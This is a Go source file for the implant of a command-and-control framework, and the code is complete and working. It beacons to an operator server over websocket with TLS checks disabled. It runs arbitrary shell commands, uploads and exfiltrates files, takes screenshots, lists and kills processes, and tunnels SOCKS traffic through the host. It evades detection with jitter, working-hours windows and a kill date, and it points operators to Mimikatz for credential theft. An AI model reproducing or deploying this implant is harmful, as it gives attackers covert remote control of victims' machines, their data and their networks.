package main

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"io"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"c2/common"

	"github.com/gorilla/websocket"
)

func runCommand(cmd string) (out string, errStr string) {
	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.Command("cmd.exe", "/c", cmd)
	} else {
		c = exec.Command("sh", "-c", cmd)
	}
	outB, err := c.CombinedOutput()
	out = string(outB)
	if err != nil {
		errStr = err.Error()
	}
	return
}

const maxFileSize = 5 * 1024 * 1024

var socksConns = make(map[string]net.Conn)
var socksConnsMu sync.Mutex

func doUpload(path string, contentB64 string) (out string, errStr string) {
	if strings.Contains(path, "..") {
		return "", "invalid path"
	}
	bytes, err := base64.StdEncoding.DecodeString(contentB64)
	if err != nil {
		return "", err.Error()
	}
	if len(bytes) > maxFileSize {
		return "", "file too large"
	}
	dir := filepath.Dir(path)
	if dir != "." {
		os.MkdirAll(dir, 0755)
	}
	if err := os.WriteFile(path, bytes, 0644); err != nil {
		return "", err.Error()
	}
	return "ok", ""
}

func doDownload(path string) (out string, errStr string) {
	if strings.Contains(path, "..") {
		return "", "invalid path"
	}
	info, err := os.Stat(path)
	if err != nil {
		return "", err.Error()
	}
	if info.IsDir() {
		return "", "is a directory"
	}
	if info.Size() > maxFileSize {
		return "", "file too large"
	}
	bytes, err := os.ReadFile(path)
	if err != nil {
		return "", err.Error()
	}
	return base64.StdEncoding.EncodeToString(bytes), ""
}

func doListDir(path string) (out string, errStr string) {
	if strings.Contains(path, "..") {
		return "", "invalid path"
	}
	if path == "" {
		path = "."
	}
	entries, err := os.ReadDir(path)
	if err != nil {
		return "", err.Error()
	}
	type ent struct {
		Name string `json:"name"`
		Dir  bool   `json:"dir"`
		Size int64  `json:"size"`
	}
	var list []ent
	for _, e := range entries {
		info, _ := e.Info()
		size := int64(0)
		if info != nil && !info.IsDir() {
			size = info.Size()
		}
		list = append(list, ent{Name: e.Name(), Dir: e.IsDir(), Size: size})
	}
	b, _ := json.Marshal(list)
	return string(b), ""
}

func doScreenshot() (out string, errStr string) {
	switch runtime.GOOS {
	case "darwin":
		c := exec.Command("screencapture", "-t", "png", "-x", "-o", "-")
		b, err := c.Output()
		if err != nil {
			return "", err.Error()
		}
		return base64.StdEncoding.EncodeToString(b), ""
	case "windows":
		ps := `Add-Type -AssemblyName System.Windows.Forms; $b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $g = [System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen([System.Drawing.Point]::Empty, [System.Drawing.Point]::Empty, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Size); $ms = New-Object System.IO.MemoryStream; $b.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png); [Convert]::ToBase64String($ms.ToArray())`
		c := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", ps)
		b, err := c.Output()
		if err != nil {
			return "", err.Error()
		}
		return strings.TrimSpace(string(b)), ""
	default:
		// Linux: try scrot, then gnome-screenshot
		if b, err := exec.Command("scrot", "-o", "-").Output(); err == nil && len(b) > 0 {
			return base64.StdEncoding.EncodeToString(b), ""
		}
		tmp, err := os.CreateTemp("", "screenshot*.png")
		if err == nil {
			name := tmp.Name()
			tmp.Close()
			defer os.Remove(name)
			if exec.Command("gnome-screenshot", "-f", name).Run() == nil {
				if b, err := os.ReadFile(name); err == nil {
					return base64.StdEncoding.EncodeToString(b), ""
				}
			}
		}
		return "", "screenshot not supported on this platform (install scrot or gnome-screenshot)"
	}
}

func doProcessList() (out string, errStr string) {
	switch runtime.GOOS {
	case "windows":
		c := exec.Command("tasklist", "/fo", "csv", "/nh", "/v")
		b, err := c.Output()
		if err != nil {
			return "", err.Error()
		}
		// Parse CSV to structured JSON: PID, Name, PPID (tasklist doesn't have PPID; use 0)
		lines := strings.Split(strings.TrimSpace(string(b)), "\n")
		type proc struct {
			PID  string `json:"pid"`
			PPID string `json:"ppid"`
			User string `json:"user"`
			Name string `json:"name"`
		}
		var list []proc
		for _, line := range lines {
			parts := parseCSVLine(line)
			if len(parts) >= 2 && parts[1] != "PID" {
				// tasklist csv: Image Name, PID, Session Name, Session#, Mem Usage, Status, User Name, ...
				pid := parts[1]
				name := parts[0]
				user := ""
				if len(parts) >= 7 {
					user = parts[6]
				}
				list = append(list, proc{PID: pid, PPID: "0", User: user, Name: name})
			}
		}
		b2, _ := json.Marshal(list)
		return string(b2), ""
	default:
		// Unix: ps -eo pid,ppid,user,comm
		psArgs := []string{"-eo", "pid,ppid,user,comm"}
		if runtime.GOOS == "darwin" {
			psArgs = []string{"-eo", "pid,ppid,user,comm"}
		}
		b, err := exec.Command("ps", psArgs...).Output()
		if err != nil {
			return "", err.Error()
		}
		lines := strings.Split(strings.TrimSpace(string(b)), "\n")
		if len(lines) < 2 {
			return "[]", ""
		}
		type proc struct {
			PID  string `json:"pid"`
			PPID string `json:"ppid"`
			User string `json:"user"`
			Name string `json:"name"`
		}
		var list []proc
		for i := 1; i < len(lines); i++ {
			fields := strings.Fields(lines[i])
			if len(fields) >= 4 {
				list = append(list, proc{PID: fields[0], PPID: fields[1], User: fields[2], Name: fields[3]})
			}
		}
		b2, _ := json.Marshal(list)
		return string(b2), ""
	}
}

func parseCSVLine(line string) []string {
	var parts []string
	var cur strings.Builder
	inQuote := false
	for i := 0; i < len(line); i++ {
		c := line[i]
		if c == '"' {
			inQuote = !inQuote
			continue
		}
		if inQuote {
			cur.WriteByte(c)
			continue
		}
		if c == ',' {
			parts = append(parts, strings.TrimSpace(cur.String()))
			cur.Reset()
			continue
		}
		cur.WriteByte(c)
	}
	parts = append(parts, strings.TrimSpace(cur.String()))
	return parts
}

func doSocksConnect(ws *websocket.Conn, connID, targetAddr string) (out string, errStr string) {
	tc, err := net.Dial("tcp", targetAddr)
	if err != nil {
		return "", err.Error()
	}
	socksConnsMu.Lock()
	socksConns[connID] = tc
	socksConnsMu.Unlock()
	go func() {
		defer func() {
			socksConnsMu.Lock()
			delete(socksConns, connID)
			socksConnsMu.Unlock()
			tc.Close()
		}()
		buf := make([]byte, 32*1024)
		for {
			n, err := tc.Read(buf)
			if err != nil {
				if err != io.EOF {
					log.Printf("socks read: %v", err)
				}
				return
			}
			if n == 0 {
				continue
			}
			msg := map[string]interface{}{
				"socks_data": true,
				"conn_id":    connID,
				"data":       base64.StdEncoding.EncodeToString(buf[:n]),
			}
			if err := ws.WriteJSON(msg); err != nil {
				return
			}
		}
	}()
	return "ok", ""
}

func doProcessKill(pidStr string) (out string, errStr string) {
	pid, err := strconv.Atoi(pidStr)
	if err != nil || pid <= 0 {
		return "", "invalid pid"
	}
	var proc *os.Process
	proc, err = os.FindProcess(pid)
	if err != nil {
		return "", err.Error()
	}
	if runtime.GOOS == "windows" {
		// On Windows FindProcess doesn't actually attach; kill via taskkill
		c := exec.Command("taskkill", "/PID", pidStr, "/F")
		if outB, err := c.CombinedOutput(); err != nil {
			return "", strings.TrimSpace(string(outB))
		}
		return "ok", ""
	}
	if err := proc.Kill(); err != nil {
		return "", err.Error()
	}
	return "ok", ""
}

func sleepWithJitter(intervalSec, jitterPercent int) {
	if intervalSec <= 0 {
		intervalSec = 30
	}
	if jitterPercent < 0 {
		jitterPercent = 0
	}
	if jitterPercent > 100 {
		jitterPercent = 100
	}
	center := time.Duration(intervalSec) * time.Second
	half := int64(center) * int64(jitterPercent) / 100
	var offset int64
	if half > 0 {
		offset = rand.Int63n(2*half+1) - half
	}
	d := center + time.Duration(offset)
	if d < time.Second {
		d = time.Second
	}
	time.Sleep(d)
}

func inWorkingHours(start, end string) bool {
	if start == "" || end == "" {
		return true
	}
	now := time.Now()
	// Parse "HH:MM" in local time
	parse := func(s string) (hour, min int) {
		parts := strings.Split(s, ":")
		if len(parts) != 2 {
			return 0, 0
		}
		h, _ := strconv.Atoi(strings.TrimSpace(parts[0]))
		m, _ := strconv.Atoi(strings.TrimSpace(parts[1]))
		return h, m
	}
	sh, sm := parse(start)
	eh, em := parse(end)
	startMins := sh*60 + sm
	endMins := eh*60 + em
	nowMins := now.Hour()*60 + now.Minute()
	if startMins <= endMins {
		return nowMins >= startMins && nowMins <= endMins
	}
	return nowMins >= startMins || nowMins <= endMins
}

func pastKillDate(killDate string) bool {
	if killDate == "" {
		return false
	}
	t, err := time.Parse(time.RFC3339, killDate)
	if err != nil {
		return false
	}
	return time.Now().After(t)
}

func main() {
	config := LoadConfig()
	wsURL := config.ServerURL
	if wsURL == "" {
		wsURL = "wss://localhost:8443/live"
	}
	interval := config.CallbackIntervalSec
	if interval <= 0 {
		interval = 30
	}
	jitter := config.JitterPercent

	for {
		if pastKillDate(config.KillDate) {
			log.Printf("Kill date reached; exiting")
			os.Exit(0)
		}
		for !inWorkingHours(config.WorkingHoursStart, config.WorkingHoursEnd) {
			sleepWithJitter(60, 10) // check every ~minute when outside window
		}
		dialer := websocket.Dialer{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		conn, _, err := dialer.Dial(wsURL, nil)
		if err != nil {
			log.Printf("Connect failed: %v; retry with jitter", err)
			sleepWithJitter(interval, jitter)
			continue
		}
		defer conn.Close()

		platform := runtime.GOOS
		if platform == "darwin" {
			platform = "macos"
		}
		auth := map[string]string{
			"client_id":     config.ClientID,
			"client_secret": config.ClientSecret,
			"platform":      platform,
		}
		if err := conn.WriteJSON(auth); err != nil {
			log.Printf("Auth send failed: %v", err)
			return
		}

		for {
			_, message, err := conn.ReadMessage()
			if err != nil {
				log.Printf("Read failed: %v", err)
				break
			}
			var cmd common.Command
			if err := json.Unmarshal(message, &cmd); err != nil {
				continue
			}
			var resp common.Response
			resp.CommandID = cmd.ID
			switch cmd.Type {
			case common.CmdPing:
				resp.Status = "success"
				resp.Output = "pong"
			case common.CmdExec:
				cmdStr := cmd.Args["command"]
				out, errStr := runCommand(cmdStr)
				resp.Output = out
				if errStr != "" {
					resp.Status = "error"
					resp.Error = errStr
				} else {
					resp.Status = "success"
				}
			case common.CmdUpload:
				out, errStr := doUpload(cmd.Args["path"], cmd.Args["content"])
				resp.Output = out
				if errStr != "" {
					resp.Status = "error"
					resp.Error = errStr
				} else {
					resp.Status = "success"
				}
			case common.CmdDownload:
				out, errStr := doDownload(cmd.Args["path"])
				resp.Output = out
				if errStr != "" {
					resp.Status = "error"
					resp.Error = errStr
				} else {
					resp.Status = "success"
				}
			case common.CmdListDir:
				out, errStr := doListDir(cmd.Args["path"])
				resp.Output = out
				if errStr != "" {
					resp.Status = "error"
					resp.Error = errStr
				} else {
					resp.Status = "success"
				}
			case common.CmdScreenshot:
				out, errStr := doScreenshot()
				resp.Output = out
				if errStr != "" {
					resp.Status = "error"
					resp.Error = errStr
				} else {
					resp.Status = "success"
				}
			case common.CmdProcessList:
				out, errStr := doProcessList()
				resp.Output = out
				if errStr != "" {
					resp.Status = "error"
					resp.Error = errStr
				} else {
					resp.Status = "success"
				}
			case common.CmdProcessKill:
				out, errStr := doProcessKill(cmd.Args["pid"])
				resp.Output = out
				if errStr != "" {
					resp.Status = "error"
					resp.Error = errStr
				} else {
					resp.Status = "success"
				}
			case common.CmdSocksConnect:
				out, errStr := doSocksConnect(conn, cmd.Args["conn_id"], cmd.Args["target_addr"])
				resp.Output = out
				if errStr != "" {
					resp.Status = "error"
					resp.Error = errStr
				} else {
					resp.Status = "success"
				}
			case common.CmdKeylogStart:
				resp.Status = "error"
				resp.Error = "keylog not supported on this platform"
			case common.CmdKeylogStop:
				resp.Status = "error"
				resp.Error = "keylog not supported on this platform"
			case common.CmdCreds:
				switch runtime.GOOS {
				case "windows":
					resp.Status = "success"
					resp.Output = "creds: upload and run your tool via exec (e.g. Mimikatz). Not implemented in implant."
				default:
					resp.Status = "success"
					resp.Output = "creds: not implemented on " + runtime.GOOS + "; use exec with your tool."
				}
			case common.CmdSocksData:
				connID := cmd.Args["conn_id"]
				data := cmd.Args["data"]
				socksConnsMu.Lock()
				tc := socksConns[connID]
				socksConnsMu.Unlock()
				if tc != nil && data != "" {
					dec, _ := base64.StdEncoding.DecodeString(data)
					tc.Write(dec)
				}
				continue
			default:
				resp.Status = "error"
				resp.Error = "unknown command type: " + cmd.Type
			}
			if err := conn.WriteJSON(resp); err != nil {
				log.Printf("Write response failed: %v", err)
				break
			}
		}
		conn.Close()
		log.Printf("Disconnected; reconnecting with jitter")
		sleepWithJitter(interval, jitter)
	}
}
